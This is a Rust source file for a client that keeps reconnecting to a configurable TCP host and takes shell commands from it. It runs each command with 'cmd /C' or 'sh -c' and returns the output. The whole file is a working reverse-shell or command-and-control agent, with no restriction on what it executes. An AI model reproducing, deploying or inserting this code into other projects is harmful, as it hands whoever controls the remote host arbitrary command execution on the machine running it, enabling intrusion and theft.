use std::sync::Arc;

use proto::comm::CommConnector;

use clap::Parser;

#[derive(Parser, Debug)]
struct Args {
    //cmd: String,
    #[arg(default_value_t = String::from("127.0.0.1:9876"))]
    hostr: String,
}

#[tokio::main]
async fn main() {    
    //std::env::set_var("RUST_LOG", "debug");
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
    let args = Args::parse();
    let manager = Arc::new(proto::session::SessionManager::new());
    let encrypt = Arc::new(proto::encrypt::enc_plain::EncryptPlain::new());
    let param = proto::comm::comm_tcp::TcpContextParam::new(Some(1), None);
    let context = proto::comm::comm_tcp::TcpContext::new(encrypt.clone(), true, manager.clone(), param);
    let connector = proto::comm::comm_tcp::CommTcpConnector::new(args.hostr, context);
    loop {
        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
        let session = connector.connect().await;
        if session.is_err() {
            log::warn!("Connect error: {}", session.err().unwrap());
            continue;
        }
        let session = session.unwrap();
        let channel = proto::channel::Channel::new(session, encrypt.clone(), 8);
        loop {
            let packet = channel.recv().await;
            if packet.is_err() {
                log::warn!("Recv error: {}", packet.err().unwrap());
                break;
            }
            let packet = packet.unwrap();
            match packet.payload {
                proto::packet::PacketPayload::CmdExec(info) => {
                    log::debug!("Received command: {}", info.cmd);

                    // execute command as shell (cmd.exe on Windows, /bin/sh on Linux)
                    use std::process::Command;
                    let output = if cfg!(target_os = "windows") {
                        Command::new("cmd")
                            .args(["/C", &info.cmd])
                            .output()
                    } else {
                        Command::new("sh")
                            .arg("-c")
                            .arg(&info.cmd)
                            .output()
                    };

                    let result = match output {
                        Ok(output) => {
                            if output.status.success() {
                                String::from_utf8_lossy(&output.stdout).to_string()
                            } else {
                                format!("Error: {}", String::from_utf8_lossy(&output.stderr))
                            }
                        },
                        Err(e) => {
                            format!("Failed to execute command: {}", e)
                        }
                    };
                    
                    let packet = proto::packet::Packet::new(proto::packet::PacketPayload::CmdExecRes(proto::packet::CmdExecRes { result }));
                    if let Err(e) = channel.send(packet).await {
                        log::warn!("Send error: {}", e);
                        break;
                    }
                }
                _ => {
                    log::warn!("Unknown packet: {:?}", packet);
                }
            }
        }
    }
}
